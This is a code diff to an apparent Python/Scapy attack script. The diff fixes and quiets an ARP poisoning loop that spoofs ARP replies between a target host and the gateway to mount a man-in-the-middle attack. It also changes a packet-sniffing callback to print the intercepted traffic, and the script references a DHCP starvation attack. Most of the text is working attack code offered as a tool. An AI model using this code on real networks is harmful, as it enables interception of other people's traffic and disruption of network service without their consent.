@@ -32,33 +32,42 @@ def get_hosts():
 		global hosts
 		hosts[host[1][1:-1]] = host[3]
 	global gateway_ip
-	gateway_ip = list(hosts.keys())[0][1:-1]
+	gateway_ip = list(hosts.keys())[0]
 	global gateway_mac
 	gateway_mac = list(hosts.values())[0]
 
 def arp_poison(target_ip):
-	print(target_ip)
 	global gateway_mac, gateway_ip
 	if gateway_ip == "" or gateway_mac == "":
 		get_hosts()
 	print("starting the mitm attack")
 	try:
 		while True:
-			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
-			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip))
+			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
+			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
 			time.sleep(2)
 	except Exception as e:
 		print(e)
 
 def mitm_callback(pkt):
-    #pkt.show()
-    ret = pkt[0][1].src + " - " + pkt[0][1].dst + "\n"
-    if hasattr(pkt[0][2], "load"):
-    	try:
-    		ret =  ret + pkt[0][2].load.decode()
-    	except Exception as e:
-    		print(e)
-    return ret
+	try:
+		#if pkt[0].type == 2054:
+		#	pass
+		if not pkt[0][1].dst == self_ip and not pkt[0][1].src == self_ip:
+			pkt.show()
+	except Exception as e:
+		pass
+
+	
+	"""
+	ret = pkt[0][1].src + " - " + pkt[0][1].dst + "\n"
+	if hasattr(pkt[0][2], "load"):
+		try:
+			ret =  ret + pkt[0][2].load.decode()
+		except Exception as e:
+			print(e)
+	return ret
+	"""
 
 def starvation_attack():
 	conf.checkIPaddr = False
@@ -91,7 +100,7 @@ while 1:
 			print()
 			continue
 		else:
-			poison_thread = threading.Thread(target=arp_poison, args=target_ip)
+			poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
 			poison_thread.start()
 			sniff_filter = "ip host " + target_ip
 			print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
